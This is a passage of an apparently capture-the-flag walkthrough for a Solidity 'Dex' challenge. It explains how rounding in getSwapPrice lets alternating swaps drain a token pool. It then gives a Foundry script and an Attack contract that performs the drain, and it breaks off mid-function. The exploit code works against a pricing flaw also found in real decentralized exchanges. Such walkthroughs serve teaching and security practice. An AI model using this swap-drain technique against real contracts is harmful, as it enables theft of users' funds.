&lt;li&gt;You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a &quot;bad&quot; price of the assets.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.&lt;&#x2F;li&gt;
&lt;li&gt;There is a &lt;code&gt;swap()&lt;&#x2F;code&gt; function inside Dex contract which swaps one token for another. Inside &lt;code&gt;swap()&lt;&#x2F;code&gt; intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.&lt;&#x2F;li&gt;
&lt;li&gt;Observe that the &lt;code&gt;getSwapPrice()&lt;&#x2F;code&gt; is used to get the amount of tokens to be transferred to the &lt;code&gt;to&lt;&#x2F;code&gt; address.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;  uint swapAmount = getSwapPrice(from, to, amount);
&lt;&#x2F;span&gt;&lt;span&gt;  IERC20(from).transferFrom(msg.sender, address(this), amount);
&lt;&#x2F;span&gt;&lt;span&gt;  IERC20(to).approve(address(this), swapAmount);
&lt;&#x2F;span&gt;&lt;span&gt;  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;amount&lt;&#x2F;code&gt; is the amount of the tokens that added to the balance of &lt;code&gt;Dex&lt;&#x2F;code&gt; contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;swapAmount&lt;&#x2F;code&gt; is the amount of tokens that goes to the &lt;code&gt;to&lt;&#x2F;code&gt; address from the balance of the &lt;code&gt;Dex&lt;&#x2F;code&gt; contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I tried calculating for swapAmout to find is there any chance that happens for the &lt;code&gt;swapAmount &amp;gt; amount&lt;&#x2F;code&gt;. So, that the &lt;code&gt;to&lt;&#x2F;code&gt; address will get more tokens than they sent.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I have observed that swapping between two tokens slightly increases the balance of the &lt;code&gt;to&lt;&#x2F;code&gt; address.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt; swap(token1, token2, 10)  
&lt;&#x2F;span&gt;&lt;span&gt;   swapAmount = (10 * 100)&#x2F;&#x2F;100 = 10
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of player in token1 = 10 - amount = 0
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of player in token2 = 10 + swapAmount = 20
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of Dex in token1 = 110
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of Dex in token2 = 100 - swapAmount = 90
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; swap(token2, token1, 20) 
&lt;&#x2F;span&gt;&lt;span&gt;   swapAmount  = (20 * 110) &#x2F;&#x2F; 90 = 24
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of player in token2 = 20 - amount = 0
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of player in token1 = 0 + swapAmount = 24
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of Dex in token2 = 90 + amount
&lt;&#x2F;span&gt;&lt;span&gt;   ==&amp;gt;  balance of Dex in token1 = 110 - swapAmount = 110 - 24 = 86
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Here you can see that the after each swap &lt;code&gt;swapAmount&lt;&#x2F;code&gt; is becoming greater than the amount the comes in.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After doing 5 swaps we need to do 45 amount of tokens swap from token2 to token1 which will make token2 balance of &lt;code&gt;Dex&lt;&#x2F;code&gt; zero.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;DexSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Dex} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Dex.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DexSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Dex public dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Dex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13dC383F59782676f31c55baa715C6F24E4d8CF5&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        address token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token1&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token2&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Token 1 : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Token 2 : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN1 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN2 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        attack&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attacker balance in TOKEN1 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attacker balance in TOKEN2 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN1 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DEX balance in TOKEN2 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Dex public dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Dex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13dC383F59782676f31c55baa715C6F24E4d8CF5&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token1&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token2&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(dex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;(uint64)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;max)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
